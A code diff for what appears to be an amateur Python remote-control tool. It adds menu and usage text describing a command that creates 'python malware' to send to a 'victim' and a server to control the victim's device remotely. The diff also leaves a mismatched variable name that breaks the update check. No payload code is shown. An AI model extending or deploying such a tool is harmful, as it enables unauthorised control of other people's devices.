@@ -7,7 +7,7 @@ c = "\033[36m"
 v = "\033[35m"
 y = "\033[33m"
 r = "\033[31m"
-none = "\033[38m"
+none = "\033[0m"
 #version of the tool
 version = "1.0"
 #importing the modules
@@ -24,7 +24,8 @@ def help_menu():
     print(f"    {y}   exit          {g}>>{r}   [{v}          use it to exit the tool                          {r}]")
     print(f"    {y}   usage         {g}>>{r}   [{v} it will show how you can the commands of te toll          {r}]{y}            usage {g}<start server>{g}")
     print(f"    {y}   update        {g}>>{r}   [{v}            it will update the toll                        {r}]")
-    print(f"    {y}   get status    {g}>>{r}   [{v} it will cheke if you are connected to the internet ro not {r}]")
+    print(f"    {y}   get status    {g}>>{r}   [{v} it will check if you are connected to the internet ro not {r}]")
+    print(f"    {y}  exploit-payload{g}>>{r}   [{v}         it will creat a python malware                    {r}]")
     print(f"    {y}   start server  {g}>>{r}   [{v}     it will start a server for the malware                {r}]")
     print(f"    {y}   cre_channel   {g}>>{r}   [{v} it will show you the creator of this tool channels        {r}]{y}            cre_channel {r}-c {g}<Github , Youtube , Facebook>{r} -o {g} <Termux , Linux , Windows , Mac>")
 class channel:
@@ -56,7 +57,7 @@ def git_repo():
             print(f" {c}[{g}+{c} {v} there is no available updates")
         else:
             print(f" {c}[{g}+{c} {v} there is an available update")
-            up_cheke = input(f" {c}[{y}?{c}] {y}do you want to update {g}y{v}/{r}n{y} : ")
+            up_check = input(f" {c}[{y}?{c}] {y}do you want to update {g}y{v}/{r}n{y} : ")
             if up_cheke == "y":
                 os.system("git pull > cache/update.txt")
                 print(f" {c}[{g}+{c}] {g}repo have ben updated")
@@ -64,3 +65,30 @@ def git_repo():
                 sys.exit()
     else:
         print(f" {c}[{r}!{c} {y} you need to connect to the internet to cheeke the update")
+
+class usage:
+    #usage for get status command
+    def usage_get_status():
+        print(f"        {v}Usage {g}get status {r}:{none}")
+        print(f"             {v} this command {r}'{g}get status{r}'{v} will alwas you to get your status will that means that it will print to you if you are {g}connected {v} or not{none}")
+        print(f"        {y} Example {r}:{none}")
+        print(f"             {c} input{r} :{none}")
+        print(f"                  {g}get status{none}")
+        print(f"             {c} output{r} :{none}")
+        print(f"                  {c}[{g}+{c}]  {v}internet status {r}>> {g}Online{none}")
+        print(f"                                {r}OR")
+        print(f"                  {c}[{r}!{c}] {v} internet status {r}>> {y}Ofline{none}")
+    #usage for start server
+    def usage_start_server():
+        print(f"        {v}Usage {g}start server {r}:{none}")
+        print(f"            {v} this command {r}'{g}start server{r}'{v} will alwas you to creat a server that will creat a connection between you and your {r}victim{v} so you can control his device remotly{none}")
+        print(f"               {v}but first you need to type {r}'{g}exploit-pyload{r}'{v} to creat a python malware and you need to send it to your {r}victim{none}")
+        print(f"        {y} Example {r}:{none}")
+        print(f"             {c} input{r} :{none}")
+        print(f"                 {g}start server{none}")
+        print(f"             {c} output{r} :{none}")
+        print(f"                 {c}[{y}!{c}] {g}starting a sever...{none}")
+        print(f"                 {c}[{g}+{c}] {g}server started{none}")
+        print(f"     {g}Tips{r}:{v} after you do that type {y}help{v} to show an auther help menu")
+    #def usage_cre_channel():
+
